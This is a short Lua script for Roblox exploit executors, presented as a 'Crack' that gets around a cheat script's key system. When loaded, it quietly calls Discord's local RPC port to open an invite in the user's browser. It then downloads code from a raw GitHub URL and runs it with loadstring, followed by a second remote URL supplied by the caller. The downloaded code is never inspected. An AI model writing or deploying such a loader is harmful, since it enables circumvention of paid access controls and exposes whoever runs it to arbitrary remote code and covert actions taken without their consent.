repeat wait() until game:IsLoaded()
local HttpService = game:GetService("HttpService")
local StarterGui = game:GetService("StarterGui")
local Request_ = (syn and syn.request) or (http and http.request) or http_request
local Crack = {}
print([[Collorem :D]])

function Crack:load(Raw)

    Request_({
        Url = 'http://127.0.0.1:6463/rpc?v=1',
        Method = 'POST',
        Headers = {
            ['Content-Type'] = 'application/json',
            Origin = 'https://discord.com'
        },
        Body = HttpService:JSONEncode({
            cmd = 'INVITE_BROWSER',
            nonce = HttpService:GenerateGUID(false),
            args = {code = "cZfYYb9Kvm"}
        })
    })
    
    local Sucess, Response = pcall(function()
            print([[Loading Crack]])
            loadstring(game:HttpGet("https://raw.githubusercontent.com/sandwichk/RobloxScripts/main/Scripts/ThunderZ/Crack.lua"))()
    end)
    if Sucess then loadstring(game:HttpGet(Raw))() 
        print([[Successfully Loaded Crack, Press "Check Key" to load script.]])
        StarterGui:SetCore("SendNotification", {
            Title = [[Successfully Loaded Crack]];
            Text = [[Press "SUBMIT" to load script.]];
            Duration = 10;
        })
    end
end

return Crack
